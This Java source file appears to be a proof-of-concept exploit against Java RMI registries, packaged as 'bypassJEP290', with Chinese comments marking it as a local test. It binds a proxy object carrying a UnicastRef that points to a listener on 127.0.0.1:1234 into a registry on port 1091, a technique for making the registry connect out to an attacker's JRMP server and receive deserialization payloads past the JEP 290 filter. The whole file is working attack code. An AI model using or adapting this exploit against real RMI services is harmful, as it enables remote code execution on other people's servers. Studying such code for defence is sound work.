package org.payload.rmi.bypassJEP290;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Random;

public class JRMPToRegistry {
    public static void ROIH() throws Exception {

        Registry reg = LocateRegistry.getRegistry("127.0.0.1",1091);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1234);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(Registry.class.getClassLoader(), new Class[] {Registry.class}, obj);
        reg.bind("test",proxy);
    }
    public static void PocHandler() throws Exception{
        Registry reg = LocateRegistry.getRegistry("127.0.0.1",1091);
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1234);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class<?>[]{Remote.class}, new PocHandler(ref));
        Registry registry = LocateRegistry.getRegistry(1091);//本地测试
        registry.bind("test", remote);
        //registry.lookup("http://127.0.0.1:1091/Hello");
    }

    public static void main(String[] args) throws Exception{
        ROIH();
        //PocHandler();
    }
}

class PocHandler implements InvocationHandler, Serializable {
    private RemoteRef ref;//来放我们的UnicastRef对象

    protected PocHandler(RemoteRef newref) {//构造方法，来引入UnicastRef
        ref = newref;
    }
    @Override
    public Object invoke(Object o, Method method, Object[] objects) throws Throwable {
        return null;
    }
}
